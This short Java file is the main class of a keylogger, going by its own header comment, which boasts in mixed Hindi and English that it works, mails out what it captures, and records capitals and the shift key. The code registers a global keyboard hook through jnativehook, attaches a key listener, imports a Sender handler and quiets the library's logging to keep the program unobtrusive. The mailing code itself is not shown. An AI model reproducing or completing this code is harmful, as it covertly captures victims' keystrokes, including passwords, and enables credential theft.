/*
 * To change this license header, choose License Headers in Project Properties.
 * i' hello this is gourav swamy typing IN CAPITAL NOW SMALL
 *mandley keylooger ka mail h yeh WORK bhi kr rha mst ..... CAPITAL AUR SMALL DONO !@##$$ shift bhi btata h...
 */
package main;


import handlers.ManageService;
import handlers.Sender;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;


/**
 * 
 * @author RITIK
 */
public class Main {
    
    public static void main(String[] args)
    { 
        ManageService service = new ManageService();
        try {
            GlobalScreen.registerNativeHook();
        } catch (Throwable ex) {
            ex.printStackTrace();
        } 
        GlobalScreen.getInstance().addNativeKeyListener(service.getKeyboard());
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
logger.setLevel(Level.WARNING);
logger.setUseParentHandlers(false);
    }
}
